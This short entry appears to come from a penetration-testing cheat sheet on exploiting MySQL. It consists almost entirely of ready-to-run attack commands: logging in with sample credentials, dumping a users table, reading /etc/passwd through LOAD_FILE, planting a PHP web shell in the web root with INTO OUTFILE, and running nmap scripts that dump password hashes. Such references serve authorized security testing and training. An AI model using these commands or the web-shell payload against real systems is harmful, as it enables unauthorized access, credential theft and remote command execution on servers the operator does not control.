---
description: |
  Enumerate MySQL databases and exploit misconfigurations.

  Reference values:
    Target IP: 10.10.10.1
    Username: pentuser
    Password: P@ssw0rd123
command: |
  # Connect
  mysql -h 10.10.10.1 -u pentuser -p'P@ssw0rd123'

  # Enumerate databases
  SHOW DATABASES;
  USE database_name;
  SHOW TABLES;
  SELECT * FROM users;

  # Read files (FILE privilege)
  SELECT LOAD_FILE('/etc/passwd');

  # Write files (FILE privilege)
  SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

  # Nmap scripts
  nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-info,mysql-query,mysql-users,mysql-variables 10.10.10.1
phase:
  - Enumeration
  - Exploitation
target_os:
  - Linux
services:
  - MySQL
items:
  - Username
  - Password
techniques:
  - Web_Injection
network_position:
  - Internal
references:
  - https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html
---
